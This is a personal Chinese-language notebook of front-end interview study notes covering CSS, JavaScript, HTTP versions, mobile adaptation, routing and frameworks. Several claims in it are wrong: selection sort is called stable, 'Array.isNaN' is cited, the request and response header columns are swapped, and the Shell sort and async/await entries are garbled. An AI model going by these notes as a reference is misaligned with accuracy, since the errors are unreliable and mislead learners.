## 不成体系的各种知识点看到不会的就记录下来

低版本浏览器不支持HTML5标签怎么解决

```html
<!--[if lt IE 9]>
  <script src="http://cdn.staticfile.org/html5shiv/r29/html5.js"></script>
<![endif]-->
```

##### CSS W3C盒子和IE盒子的如何互相转化

box-sizing属性`box-sizing: content-box|border-box|initial|inherit;`

inherit表明从父元素继承；initial表明默认值；
Content-box表示width和height属性只包含内容区的大小；
border-box表示width和height属性是`border + padding + content`的大小

##### Array对象自带的排序函数底层是怎么实现的？

查阅资料发现，V8 引擎 sort 函数只给出了两种排序 InsertionSort 和 QuickSort，数组长度小于等于 22 的用插入排序 InsertionSort，比22大的数组则使用快速排序 QuickSort,再往大因为快排用的递归，所以也不能刚太大，就用堆排。

插入排序：遍历序列，每次i都从头开始比放到合适位置

##### 邮箱 正则https://segmentfault.com/q/1010000006661187

```
/^[a-z0-9]+([._\\-]*[a-z0-9])*@([a-z0-9]+[-a-z0-9]*[a-z0-9]+\.){1,63}[a-z0-9]+$/
```

##### 面向对象 面向过程

它的设计上的特点是：继承、封装、多态

面向对象设计的核心思想是模块化，对问题进行抽象。



ps：如何实现多态？重写父类的方法

##### JS实现异步的方法

1.回调函数

2.Promise

3.事件监听，监听到再触发下一个任务

4.发布订阅模式

publish（‘done’） subscribe（‘done’，）

##### 移动端前端配适方案

1.Media Query

2.Flex

它的`viewport`是固定的：`<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">`

3.rem

750px 就把它切成100片 1em=7.5px

[讲的特别好](http://blog.csdn.net/luominting/article/details/46808105)

###### css像素与物理像素

在不同的屏幕上(普通屏幕 vs retina屏幕)，css像素所呈现的大小(物理尺寸)是一致的，不同的是1个css像素所对应的物理像素个数是不一致的。

在普通屏幕下，1个css像素 对应 1个物理像素(`1:1`)。 在retina 屏幕下，1个css像素对应 4个物理像素(`1:4`)。

###### 位图像素

在普通屏幕下是没有问题的，但是在retina屏幕下就会出现位图像素点不够，从而导致图片模糊的情况。

对于dpr=2的retina屏幕而言，1个位图像素对应于4个物理像素，由于单个位图像素不可以再进一步分割，所以只能就近取色，从而导致图片模糊(注意上述的几个颜色值)。

##### 移动端配适问题

###### retina下，图片高清问题

所以，对于图片高清问题，比较好的方案就是`两倍图片`(@2x)。

这里就还有另一个问题，如果普通屏幕下，也用了`两倍图片`，会怎样呢？

很明显，在普通屏幕下，200×300(css pixel)img标签，所对应的物理像素个数就是`200×300`个，而`两倍图片`的位图像素个数则是`200×300*4`，所以就出现一个物理像素点对应4个位图像素点，所以它的取色也只能通过一定的算法(显示结果就是一张只有原图像素总数四分之一，我们称这个过程叫做`downsampling`)，肉眼看上去虽然图片不会模糊，但是会觉得图片缺少一些锐利度，或者是有点色差(但还是可以接受的)。

解决办法：媒体查询，根据不同的尺寸上不同的图片

###### retina下，border: 1px问题

因为retina屏最小可以到0.5px。但是你写0.5px，很多浏览器就当0px来处理。

解决方法：对于dpr=2的屏幕，使用scale(.5)

###### 多屏适配布局问题

```
<meta name="viewport" content="width=640,initial-scale=0.5,maximum-scale=0.5, minimum-scale=0.5,user-scalable=no">
rem = document.documentElement.clientWidth * dpr / 10
rem = px / 基准值;
```

解决方法：使用rem处理。根据上述公式，计算基准值。还可以解决上述两个问题

###### 针对字体，要求尺寸一样

我们也会用less写一个mixin：

```
.px2px(@name, @px){
    @{name}: round(@px / 2) * 1px;
    [data-dpr="2"] & {
        @{name}: @px * 1px;
    }
    // for mx3
    [data-dpr="2.5"] & {
        @{name}: round(@px * 2.5 / 2) * 1px;
    }
    // for 小米note
    [data-dpr="2.75"] & {
        @{name}: round(@px * 2.75 / 2) * 1px;
    }
    [data-dpr="3"] & {
        @{name}: round(@px / 2 * 3) * 1px
    }
    // for 三星note4
    [data-dpr="4"] & {
        @{name}: @px * 2px;
    }
}
```



##### 懒加载的性能优化

全部一次性插入进去设置隐藏的效率远比动态插入删除效率高的多

##### cookie除了key与value还有哪些参数

path domain Expire size

##### typeof

| Undefined                                | `"undefined"`              |
| ---------------------------------------- | -------------------------- |
| Null                                     | `"object" `(see below)     |
| Boolean                                  | `"boolean"`                |
| Number                                   | `"number"`                 |
| String                                   | `"string"`                 |
| Symbol (new in ECMAScript 2015)          | `"symbol"`                 |
| Host object (provided by the JS environment) | *Implementation-dependent* |
| Function object (implements [[Call]] in ECMA-262 terms) | `"function"`               |
| Any other object                         | `"object"`                 |

```javascript
function g(){
return 23;
} 
typeof g()//number
```

##### 常用算法排序

| 排序法   | 最差时间分析     | 平均时间复杂度    | 稳定度  | 空间复杂度         |
| ----- | ---------- | ---------- | ---- | ------------- |
| 冒泡排序  | O(n2)      | O(n2)      | 稳定   | O(1)          |
| 快速排序  | O(n2)      | O(n*log2n) | 不稳定  | O(log2n)~O(n) |
| 选择排序  | O(n2)      | O(n2)      | 稳定   | O(1)          |
| 二叉树排序 | O(n2)      | O(n*log2n) | 不一顶  | O(n)          |
| 插入排序  | O(n2)      | O(n2)      | 稳定   | O(1)          |
| 堆排序   | O(n*log2n) | O(n*log2n) | 不稳定  | O(1)          |
| 希尔排序  | O          | O          | 不稳定  | O(1)          |



##### 事件绑定

addEventListener是w3c标准写法，共有三个参数，第一个为事件类型，但是不加on，第二个参数是一个函数，用于写逻辑代码进行事件操作，第三个参数为boolean型值，true或false,true表示事件捕获，false表示事件冒泡，默认为false

```javascript
function handler(e){
    //操作
    console.log(e)
}
ele.addEventListener('click', handler);//绑定
ele.removeEventListener('click', handler);//解绑
```



##### ES6和ES5继承的区别

ES5的继承实质上是先创建子类的实例对象，然后再将父类的方法添加到**this**上（Parent.apply(this)）.

ES6的继承机制完全不同，实质上是先创建父类的实例对象this（所以必须先调用父类的super()方法），然后再用子类的构造函数修改this。

##### cnd dns

CDN的全称是Content Delivery Network，即[内容分发网络](https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C)。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置[节点服务器](https://baike.baidu.com/item/%E8%8A%82%E7%82%B9%E6%9C%8D%E5%8A%A1%E5%99%A8)所构成的在现有的互联网基础之上的一层智能[虚拟网络](https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C)，CDN系统能够实时地根据[网络流量](https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F)和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。

DNS（Domain Name System，域名系统），因特网上作为域名和[IP地址](https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80)相互映射的一个[分布式数据库](https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93)，能够使用户更方便的访问[互联网](https://baike.baidu.com/item/%E4%BA%92%E8%81%94%E7%BD%91)，而不用去记住能够被机器直接读取的IP数串。通过[主机](https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA)名，最终得到该主机名对应的IP地址的过程叫做域名解析（或主机名解析）。DNS协议运行在[UDP](https://baike.baidu.com/item/UDP)协议之上，使用端口号53。



##### 文档流

`absolute`：相对于非static的最近祖先

##### Web优化策略

1. 请求数量：合并脚本和样式表, iconfont，拆分初始化负载（一开始只加载必要脚本），划分主域（增加DNS查询代价，但是增加了并发链接数）
2. 请求带宽：开启 GZip，精简 JavaScript，移除重复脚本，图像优化
3. 利用缓存：使用 CDN，使用外部 JavaScript 和 CSS，减少 DNS 查找
4. 页面结构：将样式表(影响样式的内容)放在顶部，将脚本放在底部，尽早刷新文档的输出

*** gzip静态压缩处理主要方法为： \***

1. 将web系统中的*.js、*.css文件预先通过gzip.exe压缩保存成*.jsgz 、*.cssgz 文件； 
2. 将web系统中引用js、css文件的地方转换为引用jsgz 、cssgz文件 ； 
3. 客户端请求jsgz、cssgz文件时，服务器通过过滤器设置header,将所有以jsgz、cssgz结尾的文件的请求增加设置“header Content-Encoding=gzip”的响应头。

##### rem和em的区别

都是相对font-size大小，但是rem是根据root的em，em是根据父级

##### 发现一个神奇的东西

按说substr——》对应splice     substring———》slice

但只有splice会真实的改变原来的数据，其他三个都不能

因为字符串是只读的，任何操作都不能改变字符串。

##### css百分比相对于谁

相对于父元素宽度的：
[max/min-]width、left、right、padding、margin 等；

相对于父元素高度的：
[max/min-]height、top、bottom 等；

相对于继承字号的：
font-size 等；

相对于自身字号的：
line-height 等；

相对于自身宽高的：
border-radius、background-size、transform: translate()、transform-origin、zoom、clip-path 等；

##### js严格模式

如果两个js用了不同模式，怎么放在一起？用IIFE将两者隔离开来

###### 语法限制

1.不允许使用未声明变量，当然也不许删除变量

2.对象。对象属性改动限制

3.函数。不允许名字相同的参数，arguments与参数独立。

4.eval方法只在其操作的eval内部

5.this在严格模式下始终指向指定的值，包括null和undefined。

6.不允许使用with

```javascript
'use strict'
window.color="red"; //node环境中为global.color = "red"; 
function displayColor(){
    console.log(this.color);//严格模式下报错
}
```

##### 遍历方法的区别

map():返回一个新的Array，每个元素为调用func的结果

filter():返回一个符合func条件的元素数组

some():返回一个boolean，判断是否有元素是否符合func条件

every():返回一个boolean，判断每个元素是否符合func条件

forEach():没有返回值，只是针对每个元素调用func

##### 原生css实现三角形

```css
    width: 0;
    height: 0;
    border-left: 50px solid transparent;
    border-right: 50px solid transparent;
    border-bottom: 100px solid red;
```

##### https和http以及http2

http://www.alloyteam.com/2016/07/httphttp2-0spdyhttps-reading-this-is-enough/

http1.0——>http1.1——>https——>SPDY——>http2.0

###### 影响http的主要因素

带宽和延时。带宽现在不是大问题了，主要是延时。产生延时的3个因素

1.浏览器阻塞。  因为浏览器限制最大连接数

2.DNS查询

3.建立连接。三次握手。慢启动—拥塞避免。   一开始从很小开始试网络情况，然后动态调整

###### 1.0和1.1的区别

1.缓存处理。引入了更多的缓存控制策略例如Entity tag，If-Unmodified-Since, If-Match, If-None-Match等更多可供选择的缓存头来控制缓存策略。

2.带宽优化。在请求头引入了range头域，它允许只请求资源的某个部分

3.增加了更多的错误状态码。410（Gone）表示服务器上的某个资源被永久性的删除。

4.Host头处理。在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址

5.长连接

###### 为了保证安全性，https应运而生

在http和tcp中间多加了一个层，SSL／TLS

改造成https过程：安装CA证书，大量的密钥计算增加cpu计算成本

证书的作用：实现加密传输，认证服务器身份。

###### 使用SPDY—在http和ssl中间层

1.多路复用

2.请求优先级

3.header压缩

4.基于https

###### HTTP2.0新特性

1.新的二进制格式

2.多路复用

多路复用通过多个请求stream共享一个tcp连接的方式



按层从高到低。HTTP—SPDY----SSL----TCP

##### [线程与进程](https://segmentfault.com/a/1190000005884656)

进程是cpu资源分配的最小单位，线程是cpu调度的最小单位。

##### async await和generator的区别

实验证明，前者其实就是地狱回调的样子，等callback之后再往后走。就是同步的。

async 是多个异步操作的promise对象，await相当于then

使用await Promise.all([func1(),func2()])。就可以把同步变成异步了。

区别：

前者 await后边是跟promise不是自己会转   后者跟的还是generator



##### json和对象的区别

JSON是一种数据格式，可以用来交换、存储数据。从JSON可以方便的生成JS对象。

其语法可以认为是JS Object的子集，主要区别在：

1. JSON的键必须带引号，JS可以不带（解释器自动加）
2. JSON没有函数、undefined、NaN等数据类型





##### object.create的实现原理 

我觉得，prototype引原来的，再用assign把属性方法都引过来，是不是就差不多？



##### 前后端分离怎么做？意义？

解耦可以方便完全不同的前后端人员开发，理清逻辑。如果前端变化远比后端变化快，应该分离。



##### cookie,LocalStorage被重复覆盖

cookie.setMaxAge(Integer.MAX_VALUE); 

如果要删除某个Cookie，只需要新建一个同名的Cookie，并将maxAge设置为0，并添加到response中覆盖原来的Cookie。

cookie配合sessionid，共同验证登录

后者存的是字符串。都会被覆盖。

##### js 如何添加class 不覆盖原来的

```
element.className = "redColor";//设置class
element.className += " yellowBack";//增加class
```

##### 一个何时会报undefined，何时会报referenceerror

当你var a，或者找一个对象里的某个属性，a=Object.create({});a.name的时候会报undefined。如果一个变量从未声明，则referenceerror。如果求一个简单变量查找属性，则typeerror

##### 判断js对象是否存在的方法

```javascript
1	if (!myObj) {
　　　　var myObj = { };
　　}//一定要有var，变量提升之后才不会报错，否则ReferenceError


2　　if (!window.myObj) {
　　　　var myObj = { };
　　}

3	if (!this.myObj) {
　　　　this.myObj = { };
　　}



4	var global = this;
　　if (!global.myObj) {
　　　　global.myObj = { };
　　}



5	　if (typeof myObj == "undefined") {
　　　　var myObj = { };
　　}

6	if (myObj == undefined) {
　　　　var myObj = { };
　　}

7	if (!this.hasOwnProperty('myObj')) {
　　　　this.myObj = { };
　　}

8	if (!('myObj' in window)) {
　　　　window.myObj = { };
　　}

9	　if (myObj === undefined) {
　　　　var myObj = { };
　　}
```

##### 函数优先

```javascript
  foo()   //1

  var foo;

  function foo(){
   console.log(1);
  }
  var foo= function(){
      console.log(2);
  }
```

同时出现hoist的话，函数优先。

##### window.onload和$(document).ready()的区别，浏览器加载转圈结束时哪个时间点？

感觉是完全加载完才停止转圈圈



##### babel的使用规则

**配置**：.babelrc 根据官方给的规则集配置文件

```javascript
  {
    "presets": [
      "es2015",
      "react",
      "stage-2"
    ],
    "plugins": []
  }
```

**工具**:

Babel-cli 	用于命令行转码。

Babel-node	它支持Node的REPL环境的所有功能，而且可以直接运行ES6代码。

Babel-register	每当使用`require`加载`.js`、`.jsx`、`.es`和`.es6`后缀名的文件，就会先用Babel进行转码。

Babel-core	如果某些代码需要调用Babel的API进行转码，就要使用`babel-core`模块

Babel-polyfill		Babel默认只转换新的JavaScript句法（syntax），而不转换新的API，比如Iterator、Generator、Set、Maps、Proxy、Reflect、Symbol、Promise等全局对象，以及一些定义在全局对象上的方法（比如`Object.assign`）都不会转码。



##### js的内存泄露问题

垃圾回收机制：最常用的就是引用计数

> ```javascript
> const arr = [1, 2, 3, 4];
> console.log('hello world');
> ```

上面代码中，数组`[1, 2, 3, 4]`是一个值，会占用内存。变量`arr`是仅有的对这个值的引用，因此引用次数为`1`。尽管后面的代码没有用到`arr`，它还是会持续占用内存。

**ES6新出的Weakset和WeakMap**：

```javascript
const wm = new WeakMap();

const element = document.getElementById('example');

wm.set(element, 'some information');
wm.get(element) // "some information"
```

这样，DOM 节点对象的引用计数是`1`，而不是`2`。这时，一旦消除对该节点的引用，它占用的内存就会被垃圾回收机制释放。Weakmap 保存的这个键值对，也会自动消失。

**常见的js内存泄露**：

1.意外的全局变量。当你没用var声明的时候，默认帮到window全局，就有了引用，会一直占用内存。还有this误指到全局的。可以用use strict 检测这种情况。

2.并没有清除事件

setInterval(clearInterval)，addEventListener(removeEventListener)

3.IE6中dom对象引用了js对象，而dom对象在某个时刻被移除掉了，但js引擎不知道它被移除掉，还傻傻的保留着引用呢，就不会把js对象释放。

##### url和uli的区别

总的来说，**locators are also identifiers**, so every URL is also a URI, but there are URIs which are not URLs.

##### Dom渲染树渲染过程。 其实不同的浏览器引擎渲染过程稍有不同

![browser-3](/Users/centmaster/Documents/code/interview/FE-Learning/01-html知识点/images/browser-3.png)



##### HTML和XHTML的区别

1.所有的标记都必须要有一个相应的结束标记
2.所有标签的元素和属性的名字都必须使用小写
3.所有的XML标记都必须合理嵌套
4.所有的属性必须用引号""括起来
5.把所有<和&特殊符号用编码表示
6.给所有属性赋一个值
7.不要在注释内容中使“--”
8.图片必须有说明文字

##### 怪异模式和标准模式的区别在哪（判断alert(window.top.document.compatMode) ）

1. 在严格模式中 ：width是内容宽度 ，元素真正的宽度 = marginLeft + borderLeftWidth + paddingLeft +
   width + paddinRight + borderRightWidth +  marginRight;
   在怪癖模式中 ：width则是元素的实际宽度 ，内容宽度 = width - ( paddingLeft + paddingRight + 
   borderLeftWidth + borderRightWidth)

2. 可以设置行内元素的高宽
    在Standards模式下，给span等行内元素设置width和height都不会生效，而在quirks模式下，则会生效。

3. 可设置百分比的高度
    在standards模式下，一个元素的高度是由其包含的内容来决定的，如果父元素没有设置高度，
    子元素设置一个百分比的高度是无效的。

4. 用margin:0 auto设置水平居中在IE下会失效
   使用margin:0 auto在standards模式下可以使元素水平居中，但在quirks模式下却会失效,
   quirk模式下的解决办法，用text-align属性:
   body{text-align:center};

   content{text-align:left}

5. quirk模式下设置图片的padding会失效

6. quirk模式下Table中的字体属性不能继承上层的设置

7. quirk模式下white-space:pre会失效


##### 除了ajax之外，你知道fetch嘛

```javascript
fetch(url).then(function(response) {
  return response.json();
}).then(function(data) {
  console.log(data);
}).catch(function(e) {
  console.log("Oops, error");
});
```

##### http相应头和请求头

| 相应头                        | 请求头                             |
| -------------------------- | ------------------------------- |
| Accept  用户代理可处理的媒体类型       | Accept-Ranges    是否接受字节范围请求     |
| Authorization   web认证信息    | Age    推算资源创建经过时间               |
| Host    请求资源所在的服务器         | Location    令客户端重定向至指定URI       |
| If-match    比较ETag         | WWW-Authenticate   服务器对客户端的认证信息 |
| User-Agent     Http客户端程序信息 | Server   http服务器的安装信息           |
| Max-Forwards     最大传输跳转数   | Allow    资源可支持的HTTP方法           |
| Range      实体的字节范围请求       | Content-Type   实体主体的媒体类型        |
| Referer     对请求中URI的原始获取方  | Expires     过期时间                |
|                            | Last-Modified    资源最后的修改日期      |
|                            | Content-Length     资源主体大小       |
|                            |                                 |

##### Http2 优势(https://segmentfault.com/a/1190000005085636)

多路复用		压缩头部    请求优先级		二进制			服务器推送



##### 两个页面之间通信





##### 前端路由和后端路由的区别

会造成假如两边都有一样的路径，就容易出bug



##### 为什么要使用这种框架而不用原生api操作dom，性能并没有优化

但是对于coding的人来说，牺牲一点计算量可以大大的减轻coding人的工作量



##### 严格模式

严格模式的一些主要优点包括：

- 使调试更加容易。那些被忽略或默默失败了的代码错误，会产生错误或抛出异常，因此尽早提醒你代码中的问题，你才能更快地指引到它们的源代码。
- 防止意外的全局变量。如果没有严格模式，将值分配给一个未声明的变量会自动创建该名称的全局变量。这是JavaScript中最常见的错误之一。在严格模式下，这样做的话会抛出错误。
- 消除 `this` 强制。如果没有严格模式，引用null或未定义的值到 `this` 值会自动强制到全局变量。这可能会导致许多令人头痛的问题和让人恨不得拔自己头发的bug。在严格模式下，引用 null或未定义的 `this` 值会抛出错误。
- 不允许重复的属性名称或参数值。当检测到对象（例如，`var object = {foo: "bar", foo: "baz"};`）中重复命名的属性，或检测到函数中（例如，`function foo(val1, val2, val1){}`）重复命名的参数时，严格模式会抛出错误，因此捕捉几乎可以肯定是代码中的bug可以避免浪费大量的跟踪时间。
- 使`eval()` 更安全。在严格模式和非严格模式下，`eval()` 的行为方式有所不同。最显而易见的是，在严格模式下，变量和声明在 `eval()` 语句内部的函数不会在包含范围内创建（它们会在非严格模式下的包含范围中被创建，这也是一个常见的问题源）。
- 在 `delete`使用无效时抛出错误。`delete`操作符（用于从对象中删除属性）不能用在对象不可配置的属性上。当试图删除一个不可配置的属性时，非严格代码将默默地失败，而严格模式将在这样的情况下抛出异常。

##### NaN

```javascript
console.log(typeof NaN === "number"); //true
Object.is(NaN,NaN)
Array.isNaN(NaN)
```

##### isInteger实现

```javascript
function isInteger(x) { return (x^0) === x; }
function isInteger(x) { return Math.round(x) === x; }
function isInteger(x) { return (typeof x === 'number') && (x % 1 === 0);
```

##### 实现函数， 实现功能

写一个 `sum`方法，在使用下面任一语法调用时，都可以正常工作。

```javascript
console.log(sum(2,3));   // Outputs 5
console.log(sum(2)(3));  // Outputs 5

function sum(x) {
  if (arguments.length == 2) {
    return arguments[0] + arguments[1];
  } else {
    return function(y) { return x + y; };
  }
}

function sum(x, y) {
  if (y !== undefined) {
    return x + y;
  } else {
    return function(y) { return x + y; };
  }
}

```

```
在这种情况下，由于 b 和 c都是对象，因此它们都将被转换为"[object Object]"
var a={},
    b={key:'b'},
    c={key:'c'};
 
a[b]=123;
a[c]=456;
 
console.log(a[b]);
```

##### 单向绑定和双向绑定（http://www.jianshu.com/p/4ec74cb5b748）

单向绑定非常简单，就是把Model绑定到View，当我们用JavaScript代码更新Model时，View就会自动更新

单向数据绑定缺点：HTML代码一旦生成完以后，就没有办法再变了，如果有新的数据来了，那就必须把之前的HTML代码去掉，再重新把新的数据和模板一起整合后插入到文档流中。

React可以算作单向数据中的一种。

双向数据绑定最经常的应用场景是表单，这样当用户在前端页面完成输入后，不用任何操作，就可以拿到用户的数据存放到数据模型中了。

数据模型（Module）和视图（View）之间的双向绑定。无论数据改变，或是用户操作，都能带来互相的变动，自动更新。适用于项目细节

##### 实现双向数据绑定的做法

1.发布／订阅

2.**脏检查（angular.js）**

原理是设置了一些条件，当你触发了这些条件之后，它就执行一个检测来遍历所有的数据，对比你更改了地方，然后执行变化

**3.ES7的Object.observe()**

最完美的方法，但是很多浏览器并不支持

**4.封装属性访问器/数据劫持（vue.js）**

结合发布者-订阅者模式的方式，通过ES5的`Object.defineProperty()`来劫持各个属性的`setter`，`getter`



##### 三种隐藏方式差别:visibility:hidden,display:none,opacity:0

渲染上的差异:
1.将元素设置为display:none后，元素在页面上将彻底消失，元素本来占有的空间就会被其他元素占有，也就是说它会导致浏览器的回流和重绘。

2.设置元素的visibility为hidden，和display:none的区别在于，元素在页面消失后，其占据的空间依旧会保留着，所以它只会导致浏览器重绘而不会回流。

3.opacity:0,只是看不到元素,元素依然存在并且占有原有位置. 注: 事件绑定的差异: 1、display:none：元素彻底消失，不会触发绑定的事件.
2、visibility:hidden：无法触发其点击事件，有一种说法是display:none是元素看不见摸不着，而visibility:hidden是看不见摸得着，这种说法是不准确的，设置元素的visibility后无法触发点击事件，说明这种方法元素也是消失了，只是依然占据着页面空间。
3、opacity:0：可以触发点击事件，设置元素透明度为0后，元素只是相对于人眼不存在而已，对浏览器来说，它还是存在的，所以可以触发绑定事件
动画属性的差异: 1、display:none：完全不受transition属性的影响，元素立即消失
2、visibility：hidden：元素消失的时间跟transition属性设置的时间一样，但是没有动画效果.
3、opacity:0,动画属性生效,能够进行正常的动画效果.

##### Call apply bind 的区别

call和apply都是改变上下文中的this并立即执行这个函数，bind方法可以让对应的函数想什么时候调就什么时候调用，并且可以将参数在执行的时候添加

##### 如何显式的把类数组转变成a数组：

arr =  Array.prototype.slice.call(arrLike)   或者

arr = Array.from(arrLike)   或者

arr = [...arrLike]

##### TCP避免拥塞方案

1.慢启动

新建立的tcp不能一开始就发送大量数据，从一个segment开始，一个一个慢慢往上增加数据量

2.拥塞避免

如果server超时未响应，认为网络能力下降，重设慢启动阀值

##### JSONP

```javascript
function jsonpCallback(result) {  
        //alert(result);  
        for(var i in result) {  
            alert(i+":"+result[i]);//循环输出a:1,b:2,etc.  
        }  
    }  
    var JSONP=document.createElement("script");  
    JSONP.type="text/javascript";  
    JSONP.src="http://crossdomain.com/services.php?callback=jsonpCallback";  
    document.getElementsByTagName("head")[0].appendChild(JSONP); 
```

##### [内存泄露——闭包](https://segmentfault.com/q/1010000000414875)

不可控的东西才会造成内存泄露

```javascript
function bindEvent() 
{ 
    var obj = document.createElement("XXX"); 
    obj.onclick = function(){ 
        // ... 
    } 
}

bindEvent();
```

##### 事件循环

不管是同步还是异步，都有事件列队和主线程。异步动作操作完就会像事件列队放事件。然后主线程昨晚自己手头的事就回去看列队，再继续做。

除了setTimeout和setInterval这两个方法，Node.js还提供了另外两个与"任务队列"有关的方法：[process.nextTick](http://nodejs.org/docs/latest/api/process.html#process_process_nexttick_callback)和[setImmediate](http://nodejs.org/docs/latest/api/timers.html#timers_setimmediate_callback_arg)。它们可以帮助我们加深对"任务队列"的理解。

process.nextTick方法可以在当前"执行栈"的尾部----下一次Event Loop（主线程读取"任务队列"）之前----触发回调函数。也就是说，它指定的任务总是发生在所有异步任务之前。setImmediate方法则是在当前"任务队列"的尾部添加事件，也就是说，它指定的任务总是在下一次Event Loop时执行，这与setTimeout(fn, 0)很像。

### [摘自很好的一个面经](https://github.com/Meheal/front-end-interview-questions)

##### 职业规划

1. 首先应该是一个优秀的程序员
2. 其次是努力使自己成为某一领域的技术专家
3. 通过技术更好的服务于团队和业务
4. 提高沟通能力，团队协作，发现问题，解决问题，总结问题能力
5. 写写博客，输出就是最好的学习
6. 提升个人前端的工作效率和工作质量
7. 关注前端前言技术和发展方向，通过新技术服务团队和业务
8. 一专多长

想成为优秀的前端工程师，首先在专业技能领域必不可少，其次在团队贡献、业务思索、价值判断上也有要求。这三方面能决定你的专业技能能够为公司产出多大的价值。

我觉得程序员最核心的竞争力是学习力和责任。 学习能力的源泉就是好奇心，也就是对新知识的渴求，以及对探索未知的冲动。

#####  你希望加入一个什么样的团队

- 对前端开发有激情
- 能够持之以恒的学习
- 团队做事方式是否规范（代码规范，安全规范，流程规范）
- 团队有足够的成长空间，对自己有个清晰的定位。
- 团队认可我的价值

##### 单页面应用的优缺点

优点： 1.用户体验好，快，内容的改变不需要重新加载整个页面 2.基于上面一点，SPA相对服务器压力小 3.没有页面切换，就没有白屏阻塞

缺点： 1、不利于SEO 2、初次加载耗时增多 3、导航不可用 4、容易造成css命名冲突等 5、页面复杂度提高很多，复杂逻辑难度成倍

为什么不利于SEO？

SPA简单流程 蜘蛛无法执行JS，相应的页面内容无从抓取

```
<html data-ng-app=”app”>是其标志性的标注。

```

对于这种页面来说，很多都是采用js等搜索引擎无法识别的技术来做的

##### 打包原理

webpack打包，最基本的实现方式，是将所有的模块代码放到一个数组里，通过数组ID来引用不同的模块

```
/************************************************************************/
/******/ ([
/* 0 */
/***/ function(module, exports, __webpack_require__) {

    __webpack_require__(1);
    __webpack_require__(2);
    console.log('Hello, world!');

/***/ },
/* 1 */
/***/ function(module, exports) {

    var a = 'a.js';
    console.log("I'm a.js");

/***/ },
/* 2 */
/***/ function(module, exports) {

    var b = 'b.js';
    console.log("I'm b.js");

/***/ }
/******/ ]);
```

可以发现入口entry.js的代码是放在数组索引0的位置，其它a.js和b.js的代码分别放在了数组索引1和2的位置，而webpack引用的时候，主要通过`__webpack_require__`的方法引用不同索引的模块。

##### react和vue的区别

1.函数式编程vs js、html、css分开

2.单向绑定 vs 双向绑定

3.更改model层，react要用setState（脏状态更新），vue直接改（侵入式绑定响应）。

4.virtual DOM 不一样 vue会跟踪每一个组件的依赖关系，不需要重新渲染整个组件树。而对于React而言，每当应用的状态被改变时，全部子组件都会重新渲染。当然，这可以通过shouldComponentUpdate这个生命周期方法来进行控制

##### 为什么要用虚拟dom

虚拟DOM厉害的地方并不是说它比 DOM 快（这句话本来就是错的），而是说不管你数据怎么变化，我都可以以最小的代价来更新 DOM。方法就是我在内存里面用新的数据刷新一个虚拟的 DOM 树，然后新旧 DOM 树进行比较，找出差异，再更新到真正的 DOM 树上。

##### vue 虚拟DOM和react 虚拟DOM的区别

在渲染过程中，会跟踪每一个组件的依赖关系，不需要重新渲染整个组件树。而对于React而言，每当应用的状态被改变时，全部子组件都会重新渲染。 在 React 应用中，当某个组件的状态发生变化时，它会以该组件为根，重新渲染整个组件子树。 如要避免不必要的子组件的重新渲染，你需要在所有可能的地方使用 PureComponent，或是手动实现`shouldComponentUpdate` 方法

在React中，数据流是自上而下单向的从父节点传递到子节点，所以组件是简单且容易把握的，子组件只需要从父节点提供的props中获取数据并渲染即可。如果顶层组件的某个prop改变了，React会递归地向下遍历整棵组件树，重新渲染所有使用这个属性的组件。

##### 两种实现前端路由的方式

HTML5 History两个新增的API：history.pushState 和 history.replaceState，两个 API 都会操作浏览器的历史记录，而不会引起页面的刷新。

Hash就是url 中看到 # ,我们需要一个根据监听哈希变化触发的事件( hashchange) 事件。我们用 window.location 处理哈希的改变时不会重新渲染页面，而是当作新页面加到历史记录中，这样我们跳转页面就可以在 hashchange 事件中注册 ajax 从而改变页面内容。 可以为hash的改变添加监听事件：

```
window.addEventListener("hashchange", funcRef, false)

```

- 优点

从性能和用户体验的层面来比较的话，后端路由每次访问一个新页面的时候都要向服务器发送请求，然后服务器再响应请求，这个过程肯定会有延迟。而前端路由在访问一个新页面的时候仅仅是变换了一下路径而已，没有了网络延迟，对于用户体验来说会有相当大的提升。

前端路由的优点有很多，比如页面持久性，像大部分音乐网站，你都可以在播放歌曲的同时，跳转到别的页面而音乐没有中断，再比如前后端彻底分离。 开发一个前端路由，主要考虑到页面的可插拔、页面的生命周期、内存管理等。

- 缺点

使用浏览器的前进，后退键的时候会重新发送请求，没有合理地利用缓存。

History interface提供了两个新的方法：`pushState()`, `replaceState()`使得我们可以对浏览器历史记录栈进行修改：

```
window.history.pushState(stateObject, title, URL)
window.history.replaceState(stateObject, title, URL)
```

##### 浏览器渲染原理解析

1、首先渲染引擎下载HTML，解析生成DOM Tree

2、遇到css标签或JS脚本标签就新起线程去下载他们，并继续构建DOM。（其中css是异步下载同步执行）浏览器引擎通过 DOM Tree 和 CSS Rule Tree 构建 Rendering Tree

3、 通过 CSS Rule Tree 匹配 DOM Tree 进行定位坐标和大小，这个过程称为 Flow 或 Layout 。

4、最终通过调用Native GUI 的 API 绘制网页画面的过程称为 Paint 。

当用户在浏览网页时进行交互或通过 js 脚本改变页面结构时，以上的部分操作有可能重复运行，此过程称为 Repaint 或 Reflow。 重排是指dom树发生结构变化后，需要重新构建dom结构。 重绘是指dom节点样式改变，重新绘制。 重排一定会带来重绘，重绘不一定有重排。

如何减少浏览器重排：将需要多次重排的元素，position属性设为absolute或fixed，这样此元素就脱离了文档流，它的变化不会影响到其他元素。

##### fetch和Ajax有什么不同

`XMLHttpRequest` 是一个设计粗糙的 API，不符合关注分离（Separation of Concerns）的原则，配置和调用方式非常混乱，而且基于事件的异步模型写起来也没有现代的 Promise，`generator/yield`，`async/await` 友好。

